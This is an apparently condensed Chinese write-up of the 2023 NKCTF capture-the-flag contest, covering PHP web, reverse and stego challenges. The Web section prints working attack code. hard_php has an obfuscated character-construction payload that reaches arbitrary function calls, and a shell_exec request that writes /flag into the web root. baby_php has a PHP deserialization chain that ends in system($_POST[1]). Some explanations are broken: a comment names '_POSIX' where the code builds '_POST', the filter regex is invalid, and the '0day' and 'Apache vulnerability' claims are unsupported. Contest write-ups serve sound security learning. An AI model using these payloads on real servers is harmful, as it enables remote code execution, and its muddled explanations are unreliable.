---
title: 2023 NKCTF WriteUp By EDISEC
contest: 2023 NKCTF (南开 CTF)
year: 2023
difficulty: hard
vuln_type: [rce, web_unknown, jwt, sqli, lfi, stego_image, reverse, pwn_unknown]
tags: [NKCTF, hard-php, PHP-全角字符, 数学, NAN-INF, getallheaders, phar, unserial, pdf-rce, baby_apk, easy_bmp, blue, 三体, xiaopi, baby_music, easy_rgb]
attack_chain: ["hard_php: PHP 全角字符算术 ０/０ = NAN, [''=='$'] 取第一位, 增量运算还原字母, 拼函数调用", "NKCTF=$$_[__]($$_[_]) → system(shell_exec) → echo `cat /flag`>3.txt", "easy_php: GET/POST 传 NS[CTF.go] + cmd, PDF 内嵌 JPG SHA-1 触发", "baby_php: 反序列化 Welcome → Happy → Hell0 → system($_POST[1])", "Webpagetest: getallheaders() 注入 (XRay 漏洞)", "easy_pms: 禅道 pms 已知 CVE (https://github.com/webraybtl/zentaopms_poc)", "ez_baby_apk: jadx 找加壳, frida dump dex", "easy_bmp: BMP 文件头修复, 像素 stego", "blue: 蓝牙 pcap 流量分析", "三体: 数学建模 + 文字", "first spam of rabbit year: 找春节相关字符串", "easy_rgb: 像素 RGB 通道 stego"]
key_payload: "$_=(０/０)._;$_=$_[''=='$'];$_++;$__=$_++;$__=$_++.$__;$_++;$_++;$_='_'.$__.($_++).$_;$$_[__]($$_[_]);"
one_liner: NKCTF 2023：PHP 全角字符 + PDF-RCE + ZenTao CVE + APK + BMP stego
lesson: PHP 0/0=NAN + 全角字符是字符构造经典；PDF 内嵌 JPG 触发是 0day 利用；禅道 pms CVE 是国内常见
quality: high
---

# 2023 NKCTF WriteUp By EDISEC

原文 https://www.ctfiot.com/105824.html

## Web

### 1. hard_php
```php
$_ = (０/０)._;     // ０ 是全角 0, 0/0=NAN, ._ = "NAN_"
$_ = $_['' == '$'];  // 取 [0] = "N"
$_++;                // "O"
$__ = $_++;          // $__ = "O", $_ = "P"
$__ = $_++ . $__;    // $__ = "PO", $_ = "Q"
$_++; $_++;          // $_ = "S"
$_ = '_' . $__ . ($_++) . $_;  // "_POSIX"
$$_[__] ($$_[_]);   // $_GET["__"]($_GET["_"])
```
- 用全角字符 0 作 0/0
- NAN.toString 拿 'N'
- 增量运算得字母: NAN → N → O → P → ...
- 拼出 `_POST` 字符串
- 最后 `$$_[__]($$_[_])` = `$_POST[__]($_POST[_])`

**调用：**
```
NKCTF=$$_[__]($$_[_])&__=shell_exec&_=echo `cat /flag`>/var/www/html/3.txt
```

### 2. easy_php
- GET 传 a / b / e / NS[CTF.go]
- POST 传 c（PDF 含 JPG）+ d（PDF）+ cmd
- PDF 内嵌 JPG 触发 gadget
- cmd 用 XOR 编码绕过

### 3. baby_php
```php
class Welcome { public $name; public $arg; }
function waf($s) { if (preg_match('/f|l|a|g|*|?/i', $s)) die("bad"); }
class Happy { public $shell; public $cmd; }
class Hell0 { public $func; }

$ha = new Happy();
$ha->shell = "urldecode";
$ha->cmd = 'system($_POST[1]);';
$he = new Hell0();
$he->func = $ha;
$w = new Welcome();
$w->name = "welcome_to_NKCTF";
$w->arg = $he;
echo urlencode(serialize($w));
```

### 4. Webpagetest
- `getallheaders()` 注入 (XRay 漏洞)
- https://xz.aliyun.com/t/11798#toc-1

### 5. easy_pms (禅道)
- 禅道 pms 已知 CVE
- https://github.com/webraybtl/zentaopms_poc

## Reverse

### ez_baby_apk
- jadx 看 MainActivity
- frida dump dex

## Misc

### easy_bmp
- BMP 头修复
- 像素 LSB stego

### blue
- 蓝牙 pcap 流量分析
- 还原键码

### 三体
- 数学建模 + 文字
- 找文化梗

### first spam of rabbit year
- 春节相关字符串

### easy_rgb
- RGB 通道 stego
- 还原隐藏图

## 教学价值
- **PHP 全角字符** 0/0=NAN 是字符构造经典
- **NAN 增量得字母** 是 PHP 字符生成标准
- **PDF 嵌入 JPG** 是 0day 利用
- **禅道 pms CVE** 国内常见 CMS
- **getallheaders** 注入是 Apache 漏洞

## 工具
- pwntools
- jadx + frida
- pms CVE 工具
- 010 Editor

## 关联
- NKCTF 是南开大学 CTF
- 涵盖全面：Web / Reverse / Pwn / Misc / Crypto / Blockchain / 社会工程
